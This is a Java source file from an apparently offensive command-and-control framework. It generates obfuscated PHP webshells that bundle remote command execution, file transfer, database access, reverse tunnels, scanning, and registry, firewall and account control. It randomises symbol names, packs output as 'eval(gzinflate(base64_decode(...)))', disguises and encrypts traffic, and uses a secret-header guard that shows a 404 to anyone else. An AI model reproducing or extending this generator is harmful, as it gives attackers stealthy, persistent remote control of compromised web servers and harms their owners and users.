package org.leo.phpcore.generator;

import org.leo.core.entity.Disguise;
import org.leo.core.disguise.DisguiseProtocol;
import org.leo.core.generator.GeneratedArtifact;
import org.leo.core.generator.GenerationRequest;
import org.leo.core.generator.ScriptGeneratorProvider;
import org.leo.core.runtime.PuppetRuntime;
import org.leo.phpcore.disguise.PhpSourceSupport;
import org.leo.phpcore.payload.PhpPayloadSource;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Comparator;
import java.util.LinkedHashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.zip.Deflater;

/** Generates a minimal PHP 5.6+ HTTP bootstrap with on-demand components. */
@Component
public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider {

    private static final String TEMPLATE = "/templates/php-puppet.php.txt";
    private static final String CORE_TEMPLATE = "/templates/php-core.php.txt";
    private static final String MINIMUM_VERSION = "5.6";
    private static final String OUTPUT_COMPACT = "compact";
    private static final String OUTPUT_PACKED = "packed";
    private static final String OUTPUT_PORTABLE = "portable";
    private static final String REQUEST_SENTINEL = "__LEO_REQUEST_FRAGMENT__";
    private static final String RESPONSE_SENTINEL = "__LEO_RESPONSE_FRAGMENT__";
    private static final List<String> DEFAULT_COMPONENTS = List.of(
            "BasicInfoComponent", "ExecCommandComponent", "ExecCommandSimpleComponent", "FileComponent",
            "FileDownloadComponent", "FileUploadComponent", "ExecScriptComponent",
            "DatabaseComponent", "CompressComponent", "DecompressComponent", "PluginComponent",
            "HttpRequestComponent", "ProxyForwardComponent", "ReverseTunnelComponent",
            "ProcessComponent", "NetworkInfoComponent",
            "NetworkConnectionComponent", "ScanComponent", "ServiceComponent",
            "ScheduledTaskComponent", "RegistryComponent", "EventLogComponent",
            "FirewallComponent", "UserAccountComponent");

    @Override
    public PuppetRuntime getRuntime() {
        return PuppetRuntime.PHP;
    }

    @Override
    public Map<String, Object> getMetadata() {
        Map<String, Object> metadata = new LinkedHashMap<>();
        metadata.put("runtime", "php");
        metadata.put("artifactTypes", List.of("webshell"));
        metadata.put("fileExtensions", List.of("php"));
        metadata.put("minimumVersion", MINIMUM_VERSION);
        metadata.put("protocols", List.of("http"));
        metadata.put("protocolVersion", DisguiseProtocol.PROTOCOL_VERSION);
        metadata.put("payloadCodec", "php-json-gzip-aes-cbc-hmac-v1");
        metadata.put("trafficLayer", "opaque-bytes");
        metadata.put("coreProtocol", "Envelope");
        metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
        metadata.put("outputModes", List.of(OUTPUT_COMPACT, OUTPUT_PACKED, OUTPUT_PORTABLE));
        metadata.put("defaultOutputMode", OUTPUT_COMPACT);
        metadata.put("components", DEFAULT_COMPONENTS);
        metadata.put("componentDeliveryMode", "on-demand-disk-cache");
        metadata.put("componentRequirements", componentRequirements());
        metadata.put("bundledComponents", List.of());
        metadata.put("bootstrapEncodings", Map.of(
                OUTPUT_COMPACT, "minified-php",
                OUTPUT_PACKED, "deflate-base64",
                OUTPUT_PORTABLE, "plain-php"));
        metadata.put("requirements", Map.of(
                OUTPUT_COMPACT, Map.of("minVersion", MINIMUM_VERSION,
                        "extensions", List.of("json", "openssl", "zlib"),
                        "functions", List.of("openssl_encrypt", "openssl_decrypt", "openssl_random_pseudo_bytes",
                                "hash_hmac", "hash_equals", "gzencode", "gzdecode")),
                OUTPUT_PACKED, Map.of("minVersion", MINIMUM_VERSION,
                        "extensions", List.of("json", "openssl", "zlib"),
                        "functions", List.of("base64_decode", "gzinflate")),
                OUTPUT_PORTABLE, Map.of("minVersion", MINIMUM_VERSION,
                        "extensions", List.of("json", "openssl", "zlib"),
                        "functions", List.of("openssl_encrypt", "openssl_decrypt", "openssl_random_pseudo_bytes",
                                "hash_hmac", "hash_equals", "gzencode", "gzdecode"))));
        return metadata;
    }

    @Override
    public GeneratedArtifact generate(GenerationRequest request) throws IOException {
        if (request == null || request.getRuntime() != PuppetRuntime.PHP) {
            throw new IllegalArgumentException("PHP 生成器收到错误的 runtime");
        }
        if (!"webshell".equalsIgnoreCase(request.getArtifactType())) {
            throw new IllegalArgumentException("PHP 当前支持的 artifactType 为 webshell");
        }
        Disguise requestDisguise = requireDisguise(request.getRequestDisguise(), "请求");
        Disguise responseDisguise = requireDisguise(request.getResponseDisguise(), "响应");
        String payloadKey = optionString(request.getOptions(), "payloadKey");
        if (payloadKey == null || payloadKey.trim().isEmpty()) {
            throw new IllegalArgumentException("PHP PayloadCodec AES 密钥不能为空");
        }
        String outputMode = outputMode(request.getOptions());
        int responseCode = optionInt(request.getOptions(), "respCode", 200, 200, 599);
        if (responseCode == 204 || responseCode == 205 || responseCode == 304) {
            throw new IllegalArgumentException("respCode必须允许HTTP响应体");
        }
        String headerName = optionString(request.getOptions(), "headerName");
        String headerValue = optionString(request.getOptions(), "headerValue");
        String generationSeed = optionString(request.getOptions(), "seed");
        if (generationSeed == null) generationSeed = UUID.randomUUID().toString();
        if ((headerName == null) != (headerValue == null)) {
            throw new IllegalArgumentException("headerName 与 headerValue 必须同时设置");
        }
        if (headerName != null && !headerName.matches("[A-Za-z0-9-]+")) {
            throw new IllegalArgumentException("headerName格式错误");
        }

        CoreSymbols symbols = CoreSymbols.create(generationSeed);
        CacheSymbols cacheSymbols = CacheSymbols.create(generationSeed);
        String requestDecoder = PhpSourceSupport.requestDecodeFunction(requestDisguise);
        String responseEncoder = PhpSourceSupport.responseEncodeFunction(responseDisguise);
        String coreTemplate = readTemplate(CORE_TEMPLATE)
                .replace("{{CACHE_NAMESPACE}}", cacheSymbols.namespace())
                .replace("{{CACHE_SUFFIX}}", cacheSymbols.suffix())
                .replace("{{CACHE_TEMP_PREFIX}}", cacheSymbols.temporaryPrefix());
        String coreSource = symbols.apply(compactTemplate(coreTemplate));
        List<String> components = DEFAULT_COMPONENTS;
        String expandedSource = compactTemplate(readTemplate(TEMPLATE))
                .replace("{{WIRE_HELPERS}}", PhpSourceSupport.wireHelpers())
                .replace("{{PAYLOAD_CODEC}}", PhpPayloadSource.functions(payloadKey.trim()))
                .replace("{{REQUEST_DECODER}}", requestDecoder)
                .replace("{{RESPONSE_ENCODER}}", responseEncoder)
                .replace("{{PHP_CORE}}", coreSource)
                .replace("{{CORE_ENTRY}}", symbols.entryPoint())
                .replace("{{RESPONSE_CODE}}", Integer.toString(responseCode))
                .replace("{{HEADER_GUARD}}", headerGuard(headerName, headerValue))
                .replace("{{RESPONSE_HEADERS}}", responseHeaders(responseDisguise));
        String compactSource = minifySource(expandedSource, requestDecoder, responseEncoder);
        String source = switch (outputMode) {
            case OUTPUT_PACKED -> packBootstrap(compactSource);
            case OUTPUT_PORTABLE -> expandedSource;
            default -> compactSource;
        };
        Map<String, Object> requirements = runtimeRequirements(requestDisguise, responseDisguise, outputMode);

        Map<String, Object> metadata = new LinkedHashMap<>();
        metadata.put("runtime", "php");
        metadata.put("type", "PHP");
        metadata.put("protocol", "http");
        metadata.put("minimumVersion", requirements.get("minVersion"));
        metadata.put("protocolVersion", DisguiseProtocol.PROTOCOL_VERSION);
        metadata.put("payloadCodec", "php-json-gzip-aes-cbc-hmac-v1");
        metadata.put("trafficLayer", "opaque-bytes");
        metadata.put("coreProtocol", "Envelope");
        metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
        metadata.put("outputMode", outputMode);
        metadata.put("components", components);
        metadata.put("componentDeliveryMode", "on-demand-disk-cache");
        metadata.put("componentRequirements", componentRequirements());
        metadata.put("bundledComponents", List.of());
        metadata.put("bootstrapEncoding", switch (outputMode) {
            case OUTPUT_PACKED -> "deflate-base64";
            case OUTPUT_PORTABLE -> "plain-php";
            default -> "minified-php";
        });
        metadata.put("generationSeed", generationSeed);
        metadata.put("variantId", digestHex(generationSeed).substring(0, 12));
        metadata.put("cacheLayout", "seed-derived-opaque-v1");
        metadata.put("uncompressedBytes", expandedSource.getBytes(StandardCharsets.UTF_8).length);
        metadata.put("generatedBytes", source.getBytes(StandardCharsets.UTF_8).length);
        metadata.put("requestDisguiseId", requestDisguise.getDisguiseId());
        metadata.put("responseDisguiseId", responseDisguise.getDisguiseId());
        metadata.put("headerGuardEnabled", headerName != null);

        List<String> warnings = new ArrayList<>();
        metadata.put("requirements", requirements);
        return new GeneratedArtifact(source, "php", "application/x-httpd-php", metadata, warnings);
    }

    private Map<String, Object> componentRequirements() {
        Map<String, Object> common = Map.of(
                "functions", List.of("stream_select"),
                "functionsAnyOf", List.of("shell_exec", "exec", "popen"));
        Map<String, Object> requirements = new LinkedHashMap<>();
        requirements.put("DatabaseComponent", Map.of(
                "classes", List.of("PDO"),
                "pdoDriversAnyOf", List.of("mysql", "pgsql", "sqlsrv", "dblib", "oci", "sqlite")));
        requirements.put("CompressComponent", Map.of("classes", List.of("ZipArchive")));
        requirements.put("DecompressComponent", Map.of("classes", List.of("ZipArchive")));
        requirements.put("ProcessComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
        requirements.put("NetworkConnectionComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
        requirements.put("ServiceComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
        requirements.put("ScheduledTaskComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
        requirements.put("RegistryComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
        requirements.put("FirewallComponent", Map.of("functionsAnyOf", List.of("shell_exec", "exec")));
        requirements.put("ScanComponent", Map.of(
                "functions", List.of("stream_socket_client"),
                "functionsAnyOf", List.of("shell_exec", "exec", "popen")));
        requirements.put("ProxyForwardComponent", common);
        requirements.put("ReverseTunnelComponent", common);
        return requirements;
    }

    private Map<String, Object> runtimeRequirements(Disguise requestDisguise, Disguise responseDisguise,
                                                     String outputMode) {
        Map<String, Object> requirements = new LinkedHashMap<>();
        Set<String> extensions = new LinkedHashSet<>();
        Set<String> functions = new LinkedHashSet<>();
        mergeRuntimeRequirements(requirements, extensions, functions,
                requestDisguise.getRequirements().get("php"));
        mergeRuntimeRequirements(requirements, extensions, functions,
                responseDisguise.getRequirements().get("php"));
        requirements.put("minVersion", maximumVersion(MINIMUM_VERSION,
                String.valueOf(requirements.getOrDefault("minVersion", MINIMUM_VERSION))));
        if (OUTPUT_PACKED.equals(outputMode)) {
            extensions.add("zlib");
            functions.add("base64_decode");
            functions.add("gzinflate");
        }
        extensions.add("openssl");
        extensions.add("zlib");
        functions.add("openssl_encrypt");
        functions.add("openssl_decrypt");
        functions.add("openssl_random_pseudo_bytes");
        functions.add("hash_hmac");
        functions.add("hash_equals");
        functions.add("gzencode");
        functions.add("gzdecode");
        if (!extensions.isEmpty()) requirements.put("extensions", extensions.stream().sorted().toList());
        if (!functions.isEmpty()) requirements.put("functions", functions.stream().sorted().toList());
        return requirements;
    }

    private void mergeRuntimeRequirements(Map<String, Object> target, Set<String> extensions,
                                          Set<String> functions, Object value) {
        if (!(value instanceof Map<?, ?> raw)) return;
        raw.forEach((keyValue, item) -> {
            String key = String.valueOf(keyValue);
            if ("extensions".equals(key)) {
                addStrings(extensions, item);
            } else if ("functions".equals(key)) {
                addStrings(functions, item);
            } else if ("minVersion".equals(key) && item != null) {
                target.put(key, maximumVersion(String.valueOf(target.getOrDefault(key, MINIMUM_VERSION)),
                        String.valueOf(item)));
            } else {
                target.putIfAbsent(key, item);
            }
        });
    }

    private void addStrings(Set<String> target, Object value) {
        if (value instanceof Iterable<?> iterable) {
            for (Object item : iterable) if (item != null && !String.valueOf(item).isBlank()) {
                target.add(String.valueOf(item));
            }
        } else if (value != null && !String.valueOf(value).isBlank()) {
            target.add(String.valueOf(value));
        }
    }

    private String maximumVersion(String left, String right) {
        int[] a = versionParts(left);
        int[] b = versionParts(right);
        for (int index = 0; index < Math.max(a.length, b.length); index++) {
            int av = index < a.length ? a[index] : 0;
            int bv = index < b.length ? b[index] : 0;
            if (av != bv) return av > bv ? left : right;
        }
        return left;
    }

    private int[] versionParts(String value) {
        String[] parts = value == null ? new String[0] : value.trim().split("\\.");
        int[] result = new int[parts.length];
        for (int index = 0; index < parts.length; index++) {
            String digits = parts[index].replaceAll("[^0-9].*$", "");
            try { result[index] = digits.isEmpty() ? 0 : Integer.parseInt(digits); }
            catch (NumberFormatException ignored) { result[index] = 0; }
        }
        return result;
    }

    private String packBootstrap(String source) {
        String body = source.startsWith("<?php") ? source.substring(5) : source;
        byte[] input = body.getBytes(StandardCharsets.UTF_8);
        Deflater deflater = new Deflater(Deflater.BEST_COMPRESSION, true);
        deflater.setInput(input);
        deflater.finish();
        ByteArrayOutputStream output = new ByteArrayOutputStream(input.length / 2);
        byte[] buffer = new byte[2048];
        try {
            while (!deflater.finished()) {
                int count = deflater.deflate(buffer);
                if (count <= 0) throw new IllegalStateException("PHP 启动器压缩失败");
                output.write(buffer, 0, count);
            }
        } finally {
            deflater.end();
        }
        String payload = Base64.getEncoder().encodeToString(output.toByteArray());
        return "<?php eval(gzinflate(base64_decode('" + payload + "')));";
    }

    private String outputMode(Map<String, Object> options) {
        String value = optionString(options, "outputMode");
        if (value == null) return OUTPUT_COMPACT;
        value = value.toLowerCase();
        if (!OUTPUT_COMPACT.equals(value) && !OUTPUT_PACKED.equals(value) && !OUTPUT_PORTABLE.equals(value)) {
            throw new IllegalArgumentException("outputMode仅支持compact、packed或portable");
        }
        return value;
    }

    private String compactTemplate(String source) {
        StringBuilder result = new StringBuilder(source.length());
        boolean blockComment = false;
        for (String line : source.split("\\R", -1)) {
            String trimmed = line.strip();
            if (blockComment) {
                if (trimmed.contains("*/")) blockComment = false;
                continue;
            }
            if (trimmed.startsWith("/*")) {
                if (!trimmed.contains("*/")) blockComment = true;
                continue;
            }
            if (trimmed.isEmpty()) continue;
            result.append(trimmed).append('\n');
        }
        return result.toString();
    }

    private String minifySource(String source, String requestDecoder, String responseEncoder) {
        String protectedSource = source
                .replace(requestDecoder, REQUEST_SENTINEL)
                .replace(responseEncoder, RESPONSE_SENTINEL);
        return minifyPhp(protectedSource)
                .replace(REQUEST_SENTINEL, requestDecoder.strip())
                .replace(RESPONSE_SENTINEL, responseEncoder.strip());
    }

    /** Removes optional whitespace while preserving quoted PHP source verbatim. */
    private String minifyPhp(String source) {
        StringBuilder result = new StringBuilder(source.length());
        boolean single = false;
        boolean doubleQuoted = false;
        boolean escaped = false;
        for (int index = 0; index < source.length(); index++) {
            char current = source.charAt(index);
            if (single || doubleQuoted) {
                result.append(current);
                if (escaped) {
                    escaped = false;
                } else if (current == '\\') {
                    escaped = true;
                } else if (single && current == '\'') {
                    single = false;
                } else if (doubleQuoted && current == '"') {
                    doubleQuoted = false;
                }
                continue;
            }
            if (current == '\'') {
                single = true;
                result.append(current);
                continue;
            }
            if (current == '"') {
                doubleQuoted = true;
                result.append(current);
                continue;
            }
            if (!Character.isWhitespace(current)) {
                result.append(current);
                continue;
            }
            int nextIndex = index + 1;
            while (nextIndex < source.length() && Character.isWhitespace(source.charAt(nextIndex))) nextIndex++;
            if (result.length() > 0 && nextIndex < source.length()
                    && isPhpWord(result.charAt(result.length() - 1)) && isPhpWord(source.charAt(nextIndex))) {
                result.append(' ');
            }
            index = nextIndex - 1;
        }
        return result.toString();
    }

    private boolean isPhpWord(char value) {
        return Character.isLetterOrDigit(value) || value == '_' || value == '$' || value >= 128;
    }

    private static String digestHex(String value) {
        try {
            byte[] digest = MessageDigest.getInstance("SHA-256")
                    .digest(value.getBytes(StandardCharsets.UTF_8));
            StringBuilder result = new StringBuilder(digest.length * 2);
            for (byte item : digest) result.append(String.format("%02x", item & 0xff));
            return result.toString();
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(e);
        }
    }

    private record CoreSymbols(Map<String, String> replacements, String entryPoint) {
        private static CoreSymbols create(String seed) {
            Map<String, String> replacements = new LinkedHashMap<>();
            List<String> functions = List.of("phpcore_id", "phpcore_dir", "phpcore_path", "phpcore_open",
                    "phpcore_sweep", "phpcore_test", "phpcore_load", "phpcore_invoke", "phpcore_forward",
                    "phpcore_envelope_response", "phpcore_run");
            for (String function : functions) replacements.put(function, symbol(seed, function, "f"));
            List<String> variables = List.of("$create", "$dir", "$params", "$name", "$key", "$family", "$path",
                    "$component", "$components", "$source", "$temporary", "$old", "$action", "$result",
                    "$url", "$body", "$headers", "$lines", "$value", "$lower", "$curl", "$response",
                    "$context", "$method", "$keep", "$now", "$files", "$modified", "$left", "$right",
                    "$remove");
            for (String variable : variables) replacements.put(variable, "$" + symbol(seed, variable, "v"));
            return new CoreSymbols(replacements, replacements.get("phpcore_run"));
        }

        private static String symbol(String seed, String source, String prefix) {
            return prefix + digestHex(seed + "|" + source).substring(0, 8);
        }

        private String apply(String source) {
            List<Map.Entry<String, String>> entries = new ArrayList<>(replacements.entrySet());
            entries.sort(Comparator.comparingInt((Map.Entry<String, String> entry) -> entry.getKey().length())
                    .reversed());
            String result = source;
            for (Map.Entry<String, String> entry : entries) {
                result = result.replace(entry.getKey(), entry.getValue());
            }
            return result;
        }
    }

    private record CacheSymbols(String namespace, String suffix, String temporaryPrefix) {
        private static CacheSymbols create(String seed) {
            String digest = digestHex(seed + "|php-cache-layout");
            List<String> suffixes = List.of("cache", "dat", "bin", "idx");
            int suffixIndex = Integer.parseInt(digest.substring(0, 2), 16) % suffixes.size();
            return new CacheSymbols(digest.substring(2, 16), suffixes.get(suffixIndex),
                    digest.substring(16, 24));
        }
    }

    private Disguise requireDisguise(Disguise disguise, String label) {
        PhpSourceSupport.requirePhp(disguise);
        if (disguise.getProtocolVersion() < DisguiseProtocol.PROTOCOL_VERSION) {
            throw new IllegalArgumentException(label + "伪装必须使用 protocolVersion "
                    + DisguiseProtocol.PROTOCOL_VERSION);
        }
        return disguise;
    }

    private String readTemplate(String resource) throws IOException {
        try (InputStream input = getClass().getResourceAsStream(resource)) {
            if (input == null) throw new IOException("PHP 模板不存在: " + resource);
            return new String(input.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private int optionInt(Map<String, Object> options, String key, int defaultValue, int min, int max) {
        Object raw = options.get(key);
        int value = raw instanceof Number number ? number.intValue() : defaultValue;
        if (raw != null && !(raw instanceof Number)) {
            try { value = Integer.parseInt(String.valueOf(raw)); }
            catch (NumberFormatException e) { throw new IllegalArgumentException(key + " 格式错误"); }
        }
        if (value < min || value > max) throw new IllegalArgumentException(key + " 超出范围");
        return value;
    }

    private String optionString(Map<String, Object> options, String key) {
        Object raw = options.get(key);
        if (raw == null || String.valueOf(raw).isBlank()) return null;
        return String.valueOf(raw).trim();
    }

    private String phpString(String value) {
        return "'" + value.replace("\\", "\\\\").replace("'", "\\'")
                .replace("\r", "\\r").replace("\n", "\\n") + "'";
    }

    private String headerGuard(String name, String value) {
        if (name == null) return "";
        String serverKey = "HTTP_" + name.toUpperCase().replace('-', '_');
        return "if (!isset($_SERVER[" + phpString(serverKey) + "])"
                + " || !hash_equals(" + phpString(value) + ", (string)$_SERVER["
                + phpString(serverKey) + "])) { http_response_code(404); exit; }";
    }

    private String responseHeaders(Disguise disguise) {
        Map<String, String> headers = new LinkedHashMap<>();
        if (disguise.getHeaders() != null) headers.putAll(disguise.getHeaders());
        headers.putIfAbsent("Content-Type", "text/plain;charset=utf-8");
        StringBuilder result = new StringBuilder();
        headers.forEach((name, value) -> {
            if (name != null && name.matches("[A-Za-z0-9-]+") && value != null
                    && !value.contains("\r") && !value.contains("\n")) {
                result.append("header(").append(phpString(name + ": " + value)).append(");\n");
            }
        });
        return result.toString().stripTrailing();
    }
}
